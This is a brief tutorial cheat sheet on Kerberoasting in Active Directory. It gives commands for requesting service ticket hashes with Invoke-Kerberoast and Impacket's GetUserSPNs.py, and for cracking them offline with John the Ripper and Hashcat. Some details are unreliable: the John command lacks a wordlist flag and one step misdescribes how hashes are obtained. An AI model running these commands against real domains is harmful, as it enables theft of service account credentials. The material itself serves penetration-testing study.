### Kerberoasting
Kerberoasting is an AD attack that allows a domain-connected attacker to extract SPN account hashes and crack them offline. The PowerSploit toolkit automates this process with `Invoke-Kerberoast`.

#### Kerberoasting Steps
- `Enumerate SPNs:` Find all accounts in AD that have the `servicePrincipalName` attribute.
- `Request service tickets:` Ask DC for those services.
- `Extract hashes:` Dump the service ticket data from memory; the ticket is encrypted with the service account's password hash.
- `Offline cracking:` Crack hashes offline to recover the password.
- `Impersonate service account:` Once cracket, the attacker can access resources as that service account.

### Get user SPNs
**PowerSploit**
Old PowerShell command that can be used from a domain-connected client to retrieve the hash.
```
Invoke-Kerberoast
```

**Empire**
Empire is another PowerShell library for post exploitation that includes a set of tools that can be used to get SPN records.

**Impacket**
It is a Python library hosting scripts that can interact with a Windows domain controller. For kerberoasting the script, GetUserSPNs.py can be used with any user's valid domain credentials.
```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain/username:password> -dc-ip <dc_IP> -request > output_hash.txt
```

### Cracking the Hash
**JohnTheRipper**
```
john hash.txt /usr/share/wordlists/rockyou.txt
```

**Hashcat**
```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
- `13100`: Kerberos 5 TGS-REP hash